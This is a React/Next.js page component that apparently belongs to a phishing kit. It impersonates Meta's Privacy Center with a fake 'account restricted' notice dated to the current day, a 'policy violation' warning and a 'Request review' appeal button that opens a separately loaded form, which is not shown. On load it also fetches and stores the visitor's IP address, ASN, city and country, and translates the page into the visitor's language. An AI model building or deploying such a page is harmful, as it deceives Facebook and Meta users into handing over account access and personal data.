'use client';

import BackgroundImage from '@/assets/images/bg-image.png';
import logo from '@/assets/images/logo.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import { purgeOldTranslationCaches, translateBatch } from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image, { type StaticImageData } from 'next/image';
import { useCallback, useEffect, useMemo, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

interface MenuItem {
    id: string;
    icon: IconDefinition;
    labelKey: keyof typeof DEFAULT_TEXTS;
    isActive?: boolean;
}

interface InfoCardItem {
    id: string;
    titleKey: keyof typeof DEFAULT_TEXTS;
    subtitleKey: keyof typeof DEFAULT_TEXTS;
    image?: StaticImageData;
}

const menuItems: MenuItem[] = [
    { id: 'home', icon: faHouse, labelKey: 'privacyCenterHome', isActive: true },
    { id: 'search', icon: faMagnifyingGlass, labelKey: 'search' },
    { id: 'privacy', icon: faLock, labelKey: 'privacyPolicy' },
    { id: 'rules', icon: faCircleInfo, labelKey: 'otherRules' },
    { id: 'settings', icon: faGear, labelKey: 'settings' }
];

const privacyCenterItems: InfoCardItem[] = [
    { id: 'policy', titleKey: 'privacyPolicyQ', subtitleKey: 'privacyPolicy', image: ProfileImage },
    { id: 'manage', titleKey: 'manageInfo', subtitleKey: 'privacyPolicy', image: ProfileImage }
];

const agreementItems: InfoCardItem[] = [
    { id: 'meta-ai', titleKey: 'metaAI', subtitleKey: 'userAgreementLabel', image: MetaAI }
];

const resourceItems: InfoCardItem[] = [
    { id: 'generative-ai', titleKey: 'aiInfo', subtitleKey: 'privacyCenter' },
    { id: 'ai-systems', titleKey: 'aiCards', subtitleKey: 'metaAIWebsite' },
    { id: 'intro-ai', titleKey: 'aiIntro', subtitleKey: 'forTeenagers' }
];

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo } = store();
    const [translatedTexts, setTranslatedTexts] = useState<Record<string, string>>(DEFAULT_TEXTS);
    const [modalKey, setModalKey] = useState(0);
    const [showWelcome, setShowWelcome] = useState(true);
    const [isInitialized, setIsInitialized] = useState(false);

    const defaultTexts = useMemo(() => DEFAULT_TEXTS, []);

    const currentDate = useMemo(() => {
        const date = new Date();
        const options: Intl.DateTimeFormatOptions = { month: 'long', day: 'numeric', year: 'numeric' };
        return date.toLocaleDateString('en-US', options);
    }, []);

    const translateAllTexts = useCallback(
        async (countryCode: string) => {
            try {
                const keys = Object.keys(defaultTexts);
                const texts = keys.map((key) => defaultTexts[key]);
                const batchResult = await translateBatch(texts, countryCode);
                const translated: Record<string, string> = {};
                keys.forEach((key, index) => {
                    translated[key] = batchResult[index];
                });
                setTranslatedTexts(translated);
            } catch {
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        if (isInitialized) return;

        const initializeApp = async () => {
            try {
                purgeOldTranslationCaches();
                const ipInfo = localStorage.getItem('ipInfo');
                let countryCode = 'US';

                if (ipInfo) {
                    const data = JSON.parse(ipInfo);
                    countryCode = data.country_code || 'US';
                    setGeoInfo({
                        asn: data.asn || 0,
                        ip: data.ip || 'Unknown',
                        country: data.country || 'Unknown',
                        region: data.region || 'Unknown',
                        city: data.city || 'Unknown',
                        country_code: countryCode
                    });
                } else {
                    const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                    localStorage.setItem('ipInfo', JSON.stringify(data));
                    countryCode = data.country_code || 'US';
                    setGeoInfo({
                        asn: data.asn || 0,
                        ip: data.ip || 'Unknown',
                        country: data.country || 'Unknown',
                        region: data.region || 'Unknown',
                        city: data.city || 'Unknown',
                        country_code: countryCode
                    });
                }

                setIsInitialized(true);

                if (countryCode.toUpperCase() !== 'US') {
                    translateAllTexts(countryCode);
                }
            } catch {
                setTranslatedTexts(defaultTexts);
                setIsInitialized(true);
            }
        };

        initializeApp();
    }, [defaultTexts, isInitialized, setGeoInfo, translateAllTexts]);

    const texts = translatedTexts;

    const openFormModal = () => {
        setModalKey((prev) => prev + 1);
        setModalOpen(true);
    };

    const renderInfoCards = (items: InfoCardItem[], sectionKey?: keyof typeof DEFAULT_TEXTS) => (
        <div>
            {sectionKey && <p className='font-sans font-medium text-[#212529]'>{texts[sectionKey]}</p>}
            {items.map((item, index) => {
                const isFirst = index === 0;
                const isLast = index === items.length - 1;
                const roundedClass =
                    items.length === 1
                        ? 'rounded-[15px]'
                        : isFirst
                          ? 'rounded-t-[15px] border-b border-b-gray-200'
                          : isLast
                            ? 'rounded-b-[15px]'
                            : 'border-y border-y-gray-200';

                return (
                    <div
                        key={item.id}
                        className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}
                    >
                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                        <div className='flex flex-1 flex-col'>
                            <p className='font-medium'>{texts[item.titleKey]}</p>
                            <p className='text-[#465a69]'>{texts[item.subtitleKey]}</p>
                        </div>
                        <FontAwesomeIcon icon={faChevronRight} />
                    </div>
                );
            })}
        </div>
    );

    if (showWelcome) {
        return (
            <div className='relative flex min-h-screen items-center justify-center bg-white'>
                <div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
                    <div className='overflow-hidden rounded-lg'>
                        <Image src={logo} alt='Logo' className='mx-auto mb-0 block h-full w-full' priority />
                    </div>

                    <p className='text-2xl font-bold'>{texts.welcomeTitle}</p>

                    <p className='text-gray-700'>
                        {texts.welcomeDesc}{' '}
                        <a className='text-blue-500 hover:underline' href='https://www.facebook.com/help' target='_blank' rel='noreferrer'>
                            {texts.welcomeMoreInfo}
                        </a>
                    </p>

                    <div className='px-[14px]'>
                        <ol className='relative border-s-2 border-gray-200 text-gray-500'>
                            <li className='mb-10 ms-6'>
                                <span className='absolute -start-[14px] flex h-6 w-6 items-center justify-center rounded-full bg-[#C4C4C4] ring-4 ring-white'>
                                    <svg className='h-3 w-3 text-white' aria-hidden='true' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 12'>
                                        <path stroke='currentColor' strokeLinecap='round' strokeLinejoin='round' strokeWidth='2' d='M1 5.917 5.724 10.5 15 1.5' />
                                    </svg>
                                </span>
                                <h3 className='text-black'>{texts.welcomeStep1}</h3>
                            </li>
                            <li className='ms-6'>
                                <span className='absolute -start-[14px] flex h-6 w-6 items-center justify-center rounded-full bg-[#35589e] ring-4 ring-white'>
                                    <svg className='h-3 w-3 text-white' aria-hidden='true' xmlns='http://www.w3.org/2000/svg' fill='currentColor' viewBox='0 0 20 16'>
                                        <path d='M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z' />
                                    </svg>
                                </span>
                                <h3 className='text-black'>{texts.welcomeStep2}</h3>
                            </li>
                        </ol>
                    </div>

                    <button
                        type='button'
                        onClick={() => setShowWelcome(false)}
                        className='block w-full cursor-pointer rounded-lg bg-blue-500 py-3 text-center text-lg font-semibold text-white transition-colors hover:bg-blue-600'
                    >
                        {texts.welcomeContinue}
                    </button>

                    <p className='mt-3 mb-5 block text-center'>
                        {texts.welcomeRestrictedOn} <strong>{currentDate}</strong>.
                    </p>
                </div>
            </div>
        );
    }

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <div className='flex w-full max-w-[1100px]'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{texts.privacyCenterTitle}</p>
                    {menuItems.map((item) => (
                        <div
                            key={item.id}
                            className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}
                        >
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{texts[item.labelKey]}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{texts.policyViolation}</p>
                    </div>
                    <p>{texts.policyViolationMessage}</p>
                    <div className='rounded-b-[20px] bg-white'>
                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
                        <div className='flex flex-col items-center justify-center gap-5 p-5'>
                            <p className='text-2xl'>{texts.appealFormIntro}</p>
                            <p className='text-[15px]'>{texts.appealFormNote}</p>
                            <button
                                type='button'
                                onClick={openFormModal}
                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {texts.requestReview}
                            </button>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        {renderInfoCards(privacyCenterItems, 'privacyCenterTitle')}
                        {renderInfoCards(agreementItems, 'userAgreement')}
                        {renderInfoCards(resourceItems, 'additionalResources')}
                        <p className='text-[15px] text-[#465a69]'>{texts.privacyFooter}</p>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
